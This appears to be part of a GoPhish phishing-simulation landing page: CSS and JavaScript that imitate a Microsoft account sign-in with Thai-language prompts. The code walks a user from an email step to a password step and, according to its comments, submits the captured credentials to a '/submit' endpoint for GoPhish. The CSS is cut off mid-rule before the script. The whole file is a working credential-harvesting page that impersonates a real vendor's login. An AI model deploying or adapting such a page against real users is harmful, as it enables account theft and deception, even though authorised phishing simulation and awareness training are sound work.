/* Additional styles for password section */
#passwordSection .form-control {
    border-width: 1px;
    border-style: solid;
    border-color: rgba(0,0,0,.6);
    height: 36px;
    outline: none;
    border-radius: 0;
    -webkit-border-radius: 0;
    background-color: transparent;
    border-top-width: 0;
    border-left-width: 0;
    border-right-width: 0;
    padding: 6px 10px 6px 0px;
    font-size: 15px;
    margin-top: 8px;
    width: 100%;
}

#passwordSection .form-control:focus {
    border-color: #0067b8;
}

/* Cancel button styles */
#cancelButton, #cancelButtonNext {
    min-height: 32px;
    border: 1px solid rgba(0,0,0,.6);
    min-width: 80px;
    line-height: normal;
    background-color: transparent;
    color: #0067b8;
    padding: 4px 12px;
}

#cancelButton:hover, #cancelButtonNext:hover {
    background-color: rgba(0,0,0,.1);
    border-color: #0067b8;
}

#cancelButton:focus, #cancelButtonNext:focus {

<script>
// Set postUrl for GoPhish integration
var postUrl = '/submit';

// Email validation regex
function isValidEmail(email) {
    const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
    return emailRegex.test(email);
}

// Function to handle progressive form display
function showPasswordStep(email) {
    // Hide the email input section
    const emailSection = document.querySelector('.form-group.col-md-24:not(#passwordSection):not(#signInButtonSection)');
    if (emailSection) {
        emailSection.style.display = 'none';
    }
   
    // Hide the Next button section
    const nextButtonSection = document.querySelector('.win-button-pin-bottom:not(#signInButtonSection)');
    if (nextButtonSection) {
        nextButtonSection.style.display = 'none';
    }
    
    // Show email display in password section
    const emailDisplay = document.getElementById('emailDisplay');
    if (emailDisplay) {
        
        emailDisplay.textContent = email;
    }
    
    // Show password section in the same location
    const passwordSection = document.getElementById('passwordSection');
    if (passwordSection) {
        passwordSection.style.display = 'block';
    }
    
    // Show Sign in button section  
    const signInButtonSection = document.getElementById('signInButtonSection');
    if (signInButtonSection) {
        signInButtonSection.style.display = 'block';
    }
   
    // Focus on password field
    const passwordField = document.getElementById('passwd');
    if (passwordField) {
        passwordField.focus();
    }
}

// Function to handle cancel action
function cancelPasswordStep() {
    // Hide password section
    const passwordSection = document.getElementById('passwordSection');
    if (passwordSection) {
        passwordSection.style.display = 'none';
    }
    
    // Hide Sign in button section
    const signInButtonSection = document.getElementById('signInButtonSection');
    if (signInButtonSection) {
        signInButtonSection.style.display = 'none';
    }
    
    // Show the email input section
    const emailSection = document.querySelector('.form-group.col-md-24:not(#passwordSection):not(#signInButtonSection)');
    if (emailSection) {
        emailSection.style.display = 'block';
    }
    
    // Show the Next button section
    const nextButtonSection = document.querySelector('.win-button-pin-bottom:not(#signInButtonSection)');
    if (nextButtonSection) {
        nextButtonSection.style.display = 'block';
    }
    
    // Clear password field
    const passwordField = document.getElementById('passwd');
    if (passwordField) {
        passwordField.value = '';
    }
    
    // Focus back on email field
    const emailField = document.querySelector('input[name="loginfmt"]');
    if (emailField) {
        emailField.focus();
    }
}

// Function to handle Next button click
function handleNextButtonClick() {
    const email = document.querySelector('input[name="loginfmt"]').value;
    
    if (!email || email.trim() === '') {
        alert('กรุณากรอกอีเมล เบอร์โทรศัพท์ หรือชื่อ Skype');
        return;
    }
    
    if (!isValidEmail(email.trim())) {
        alert('กรุณากรอกอีเมลให้ถูกต้อง');
        return;
    }
    
    // If email is valid, show password step
    showPasswordStep(email.trim());
}

// Add event listeners when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    // Get references to form elements
    const emailField = document.querySelector('input[name="loginfmt"]');
    const cancelButtonNext = document.getElementById('cancelButtonNext');
    const nextButton = document.getElementById('idSIButton9');
    const signInButton = document.getElementById('idSIButton10');
    const cancelButton = document.getElementById('cancelButton');
    const passwordField = document.getElementById('passwd');
    
    // Function to update Cancel button visibility based on email validation
    function updateCancelButtonVisibility() {
        if (emailField && cancelButtonNext) {
            const email = emailField.value.trim();
            if (email && isValidEmail(email)) {
                cancelButtonNext.style.display = 'inline-block';
            } else {
                cancelButtonNext.style.display = 'none';
            }
        }
    }
    
    // Monitor email input changes in real-time
    if (emailField) {
        // Listen for input changes (typing)
        emailField.addEventListener('input', updateCancelButtonVisibility);
        
        // Listen for paste events
        emailField.addEventListener('paste', function() {
            // Use setTimeout to allow paste to complete before validation
            setTimeout(updateCancelButtonVisibility, 0);
        });
        
        // Listen for keyup events (for better responsiveness)
        emailField.addEventListener('keyup', updateCancelButtonVisibility);
        
        // Initial check on page load
        updateCancelButtonVisibility();
        
        // Handle Enter key press on email field
        emailField.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                handleNextButtonClick();
            }
        });
    }

    // Handle Next button click
    if (nextButton) {
        nextButton.addEventListener('click', function(e) {
            e.preventDefault();
            handleNextButtonClick();
        });
    }
    
    // Handle Cancel button click (Next step)
    if (cancelButtonNext) {
        cancelButtonNext.addEventListener('click', function(e) {
            e.preventDefault();
            // Reset form or perform cancel action
            if (emailField) {
                emailField.value = '';
                emailField.focus();
                // Update Cancel button visibility after clearing
                updateCancelButtonVisibility();
            }
        });
    }    // Handle Sign in button click
    if (signInButton) {
        signInButton.addEventListener('click', function(e) {
            // Let the form submit naturally - don't prevent default
            // The form will submit to GoPhish automatically
        });
    }
    
    // Handle Cancel button click (Password step)
    if (cancelButton) {
        cancelButton.addEventListener('click', function(e) {
            e.preventDefault();
            cancelPasswordStep();
        });
    }    // Handle Enter key press on password field
    if (passwordField) {
        passwordField.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                // Let the form submit naturally - don't prevent default
                // The form will submit to GoPhish automatically
            }
        });
    }
});
</script>
